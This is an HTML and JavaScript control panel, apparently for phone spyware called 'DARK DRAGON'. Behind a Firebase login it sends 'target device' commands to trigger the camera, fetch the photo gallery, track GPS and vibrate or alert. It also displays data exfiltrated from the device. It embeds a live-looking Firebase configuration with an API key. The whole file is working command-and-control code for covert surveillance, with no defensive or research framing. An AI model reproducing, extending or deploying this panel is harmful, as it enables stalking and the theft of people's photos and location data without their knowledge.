<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARK DRAGON | ADMIN TERMINAL</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
        .container { display: flex; justify-content: center; align-items: center; height: 100vh; }
        
        /* Login UI */
        #login-box { border: 2px solid #0f0; padding: 40px; box-shadow: 0 0 20px #0f0; text-align: center; background: #050505; }
        input { display: block; width: 280px; margin: 15px 0; background: #111; border: 1px solid #0f0; color: #0f0; padding: 12px; outline: none; }
        button { width: 100%; background: #0f0; color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
        button:hover { background: #008f11; color: #fff; }

        /* Dashboard UI */
        #dashboard { display: none; padding: 20px; box-sizing: border-box; min-height: 100vh; }
        .header { border-bottom: 2px solid #0f0; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .grid { display: grid; grid-template-columns: 1fr 2fr; gap: 20px; }
        .panel { border: 1px solid #0f0; padding: 20px; background: #050505; box-shadow: 0 0 10px rgba(0,255,0,0.1); }
        .log-screen { background: #001100; height: 250px; overflow-y: auto; padding: 10px; font-size: 13px; border: 1px solid #0f0; color: #0f0; }
        .cmd-btn { display: block; width: 100%; margin-bottom: 12px; text-align: left; background: transparent; border: 1px solid #0f0; color: #0f0; padding: 12px; cursor: pointer; font-family: inherit; }
        .cmd-btn:hover { background: #0f0; color: #000; }
        .status-dot { height: 10px; width: 10px; background-color: #0f0; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="container" id="auth-container">
        <div id="login-box">
            <h1 style="margin:0; font-size: 24px;">DARK DRAGON</h1>
            <p style="font-size: 12px; letter-spacing: 2px;">SECURE ACCESS POINT</p>
            <input type="email" id="email" placeholder="Admin Email">
            <input type="password" id="pass" placeholder="Secret Key">
            <button onclick="login()">Initialize System</button>
        </div>
    </div>

    <div id="dashboard">
        <div class="header">
            <div><span class="status-dot"></span> SYSTEM: ONLINE</div>
            <div style="font-weight: bold;">AKINDU CONTROL PANEL v1.0</div>
            <button onclick="logout()" style="width: auto; padding: 5px 15px; font-size: 12px;">LOGOUT</button>
        </div>

        <div class="grid">
            <div class="panel">
                <h3 style="border-bottom: 1px solid #0f0;">COMMAND CENTER</h3>
                <button class="cmd-btn" onclick="sendCommand('camera')">>> TRIGGER CAMERA</button>
                <button class="cmd-btn" onclick="sendCommand('gallery')">>> FETCH GALLERY</button>
                <button class="cmd-btn" onclick="sendCommand('location')">>> TRACK GPS</button>
                <button class="cmd-btn" onclick="sendCommand('vibrate')">>> REMOTE VIBRATE</button>
                <button class="cmd-btn" onclick="sendCommand('notify')">>> SEND ALERT MESSAGE</button>
            </div>

            <div class="panel">
                <h3 style="border-bottom: 1px solid #0f0;">SYSTEM LOGS & DATA</h3>
                <div class="log-screen" id="logs">
                    [SYSTEM]: Secure handshake complete.<br>
                    [SYSTEM]: Awaiting target device connection...
                </div>
                
                <h4 style="margin-top:20px;">INCOMING DATA PREVIEW</h4>
                <div id="data-preview" style="border: 1px dashed #0f0; padding: 15px; min-height: 80px; font-size: 14px; background: #111;">
                    No data stream detected...
                </div>
            </div>
        </div>
    </div>

    <script>
        // FIREBASE CONFIGURATION
        const firebaseConfig = {
            apiKey: "AIzaSyB4K6JgS_tn5rDLeA1i9-xqQ9rNZSE5ms8",
            authDomain: "dark-dragon-team.firebaseapp.com",
            databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com",
            projectId: "dark-dragon-team",
            storageBucket: "dark-dragon-team.firebasestorage.app",
            messagingSenderId: "307911947460",
            appId: "1:307911947460:web:8ef3475cdeb54ae1448591"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();

        // Login Logic
        function login() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            auth.signInWithEmailAndPassword(email, pass)
                .then(() => {
                    document.getElementById('auth-container').style.display = 'none';
                    document.getElementById('dashboard').style.display = 'block';
                    addLog("Access Authorized. Dashboard Loaded.");
                })
                .catch((error) => {
                    alert("Unauthorized Access Attempt: " + error.message);
                });
        }

        // Send Command to Firebase
        function sendCommand(action) {
            db.ref('commands').set({
                action: action,
                timestamp: Date.now(),
                status: "pending"
            }).then(() => {
                addLog("Sent Command: " + action.toUpperCase());
            }).catch(err => addLog("Error: " + err.message));
        }

        // Add Logs to Screen
        function addLog(msg) {
            const logBox = document.getElementById('logs');
            const time = new Date().toLocaleTimeString();
            logBox.innerHTML += `<br>[${time}]: ${msg}`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        // Listen for Incoming Data from Device
        db.ref('device_data').on('value', (snapshot) => {
            const data = snapshot.val();
            if (data) {
                document.getElementById('data-preview').innerHTML = 
                    `<pre style="color: #0f0;">${JSON.stringify(data, null, 2)}</pre>`;
                addLog("New data received from target.");
            }
        });

        // Logout
        function logout() {
            auth.signOut().then(() => location.reload());
        }
    </script>
</body>
</html>
